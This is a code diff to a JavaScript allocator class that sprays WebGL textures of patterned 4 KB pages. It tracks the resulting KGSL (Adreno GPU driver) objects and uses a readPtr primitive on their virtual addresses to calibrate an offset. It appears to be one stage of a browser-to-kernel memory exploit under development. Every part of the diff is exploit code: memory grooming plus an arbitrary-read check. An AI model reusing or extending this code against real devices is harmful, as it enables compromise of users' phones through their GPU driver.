@@ -1,8 +1,9 @@
-
 class Allocator {
   constructor(pages) {
     this.pages = pages;
-    this.SLEEP = 32 * PAGES_PER_MB
+    this.SLEEP = 1000
+    this.SLEEP_STEP = PAGES_PER_MB * 32
+    this.JS_ARRAY_MB = 8
     
     this.initKGSL = []
     this.initKGSLIds = []
@@ -30,23 +31,55 @@ class Allocator {
     
     console.log(`[Allocator] ++ ${this.newKGSL.length} unique new textures found.`);
     if (this.newKGSL.length !== this.pages) {
-      console.warn(`[Allocator] wrong textures [Expected ${this.pages}] != [Got ${this.newKGSL.length}]`)
-      if (this.pages > this.newKGSL.length) {
-        console.log(`[Allocator] Ignoring..`)
-      }
-      else {
-        this.offset = (this.pages-this.newKGSL.length)
-      }
+      console.warn(`[Allocator] wrong texture count[Expected ${this.pages}] != [Got ${this.newKGSL.length}]`)
+      this.offset = this.newKGSL.length - this.pages
     }
-
+    
+    console.log(`[Allocator] OFFSET: ${this.offset}`)
     // modifies this.newKGSL
     this.sortSelf()
     
     // add the original index of all textures 
+    // for (let i = this.offset; i < this.pages-this.offset; i++) {
+    //   this.newKGSL[i-this.offset].texture = this.textures[i]
+    //   this.newKGSL[i-this.offset].estValue = i % 256
+    // }
     for (let i = 0; i < this.pages; i++) {
       this.newKGSL[i].texture = this.textures[i]
+      this.newKGSL[i].estValue = i % 256
     }
 
+    let offsetIdx = 0
+    for (let i = 0; i < this.newKGSL.length; i += (64)) {
+      let realValue = (await readPtr(this.newKGSL[i].v_addr)).val;
+      let estValue = this.newKGSL[i].estValue
+      if (realValue != estValue) {
+        console.error(`+ Wrong textures estimate real: ${realValue}, estimate: ${estValue}`)
+      }
+      else {
+        if ( offsetIdx == 0 ) {
+          offsetIdx = i
+        }
+        console.log(`+ Correct textures estimate real: ${realValue}, estimate: ${estValue}`)
+        break
+      }
+    }
+    // for (let i = 0; i < offsetIdx; i += 2) {
+    //   let realValue = (await readPtr(this.newKGSL[i].v_addr)).val;
+
+    //   console.log(``)
+    // }
+
+    console.log(`[Allocator] OFFSET INDEX: ${offsetIdx}`)
+    this.pages = this.pages - offsetIdx
+    this.newKGSL.slice(offsetIdx)
+    
+    console.log(`[Allocator] new pages count: ${this.pages}`)
+
+    
+
+
+    
     return Promise.resolve(true)
   }
 
@@ -117,10 +150,10 @@ class Allocator {
     for (let i = 0; i < this.pages; i++) {
       const t = createTexture2DRGBA(createUint8Array(KB4, i%256), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
       this.textures.push(t);
-      if (i % this.SLEEP == 0 && i > 0) {
+      if (i % this.SLEEP_STEP == 0 && i > 0) {
         console.debug(`[Allocator] [${i}/${this.pages}] pages created so far. Taking a short break.`);
-        await sleep(1000);
-        allocatePages(8 * PAGES_PER_MB)
+        await sleep(this.SLEEP);
+        allocatePages(this.JS_ARRAY_MB * PAGES_PER_MB)
       }
     }
     return Promise.resolve(1)
